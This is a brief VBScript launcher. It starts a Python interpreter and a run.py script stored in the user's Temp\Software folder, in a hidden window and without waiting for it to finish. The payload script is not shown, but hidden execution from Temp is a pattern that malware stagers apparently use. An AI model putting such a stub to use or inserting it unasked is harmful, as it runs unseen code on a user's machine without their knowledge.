Set objShell = CreateObject("Wscript.Shell")

tempPath = objShell.ExpandEnvironmentStrings("%USERPROFILE%\AppData\Local\Temp\Software")
pythonPath = Chr(34) & tempPath & "\python.exe" & Chr(34)
scriptPath = Chr(34) & tempPath & "\run.py" & Chr(34)

command = pythonPath & " " & scriptPath

objShell.Run command, 0, False
